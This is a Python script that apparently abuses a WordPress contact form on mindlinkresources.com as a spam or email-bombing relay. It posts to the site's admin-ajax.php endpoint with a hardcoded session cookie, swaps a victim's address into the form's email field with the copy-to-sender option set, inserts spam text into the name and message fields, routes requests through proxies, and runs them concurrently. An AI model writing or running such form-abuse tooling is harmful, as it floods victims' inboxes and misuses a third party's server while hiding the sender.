from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': 'p9o0ge7fo08hidr68g9u65msqe',
}

headers = {
    'authority': 'mindlinkresources.com',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://mindlinkresources.com',
    'pragma': 'no-cache',
    'referer': 'https://mindlinkresources.com/contact-us/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

s = 'thanks'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'action': 'paupanels',
            'data': 'paupress_user_meta%5Bfirst_name%5D=test&paupress_user_meta%5Blast_name%5D=test&email=wezxasqw%40gmail.com&_pp_post%5Bpp_form_title%5D=test&_pp_post%5Bpp_form_content%5D=test&_pp_post%5Bpp_form_cc%5D=true&rel=post&pau_form=_pp_form_contact_form&pp_form_submission=send',
            'form': '_pp_form_contact_form',
            # 'paupanels_nonce': '31b091b80c',
        }

        data['data'] = data['data'].replace('wezxasqw%40gmail.com', target.replace('@', '%40')).replace('test',
                                                                                                        self.get_text())

        response = requests.post('https://mindlinkresources.com/wp-admin/admin-ajax.php', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
